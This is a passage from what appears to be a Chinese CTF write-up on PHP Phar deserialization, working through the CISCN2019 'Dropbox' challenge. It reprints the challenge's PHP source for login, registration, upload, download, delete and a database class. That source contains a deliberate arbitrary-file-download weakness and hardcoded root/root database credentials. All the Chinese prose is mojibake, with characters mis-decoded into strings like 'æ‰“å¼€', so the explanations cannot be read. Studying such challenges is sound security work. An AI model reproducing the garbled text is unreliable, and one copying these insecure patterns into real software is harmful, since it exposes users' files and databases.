class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>notepadæ‰“å¼€æŸ¥çœ‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132602458.png" alt loading="lazy"></p><p>å’Œä¸Šé¢çš„ä¸€æ ·å¯ä»¥åˆ©ç”¨æˆåŠŸ</p><h3 id="æ —å­"><a href="#æ —å­" class="headerlink" title="æ —å­"></a>æ —å­</h3><h4 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-â€”Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-â€”Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]â€”Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]â€”Dropbox</h4><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212154616.png" alt loading="lazy"></p><p>å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ï¼Œéšåå‘ç°æœ‰ä¸Šä¼ æ–‡ä»¶å’Œä¸‹è½½ï¼Œåˆ é™¤æ–‡ä»¶çš„åŠŸèƒ½</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212308364.png" alt loading="lazy"></p><p>æµ‹è¯•æ–‡ä»¶ä¸Šä¼ ï¼Œåªèƒ½ä¸Šä¼ é‚£ä¸‰ç§å›¾ç‰‡çš„æ ¼å¼ï¼Œåº”è¯¥æ˜¯æœ‰ç™½åå•ï¼Œä¸”æ–‡ä»¶ä¸Šä¼ åè·¯å¾„ä¸å¯çŸ¥ï¼Œäºæ˜¯æŠ“åŒ…æµ‹è¯•æ–‡ä»¶ä¸‹è½½å’Œåˆ é™¤åŠŸèƒ½ï¼Œå…¶ä¸­æ–‡ä»¶ä¸‹è½½å¤„å­˜åœ¨æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œäºæ˜¯å°†æ•´ä¸ªç½‘ç«™çš„æºç éƒ½ä¸‹è½½ä¸‹æ¥ï¼Œæµ‹è¯•åå‘ç°ï¼Œåå°åœ¨ä¸‹è½½ç•Œé¢è¿˜æ˜¯åšäº†æƒé™é™åˆ¶çš„ï¼Œä¸ç„¶æ ¹ç›®å½•ä¸‹çš„<code>flag</code>å°±å¯ä»¥ç›´æ¥ä¸‹ä¸‹æ¥äº†</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212700778.png" alt loading="lazy"></p><p>æœ‰ä»¥ä¸‹æ–‡ä»¶ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504213252372.png" alt loading="lazy"></p><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>.........(HTML)<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'register'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('æ³¨å†ŒæˆåŠŸ', 'info');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$u</span><span class="token operator">-></span><span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"sftUahRiTz"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>window.location.href='index.php';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('è´¦å·æˆ–å¯†ç é”™è¯¯', 'warning');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>register.php</p><pre class="language-php" data-language="php"><code class="language-php">.........(HTML)<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$u</span><span class="token operator">-></span><span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>window.location.href='login.php?register';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('æ­¤ç”¨æˆ·åå·²è¢«ä½¿ç”¨', 'warning');&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('è¯·è¾“å…¥æœ‰æ•ˆç”¨æˆ·åå’Œå¯†ç ', 'warning');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>upload.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pos</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".png"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Only gif/jpg/png allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$dst</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token variable">$fileext</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$dst</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Invaild filename"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>download.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: attachment; filename="</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File not exist"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>delete.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span 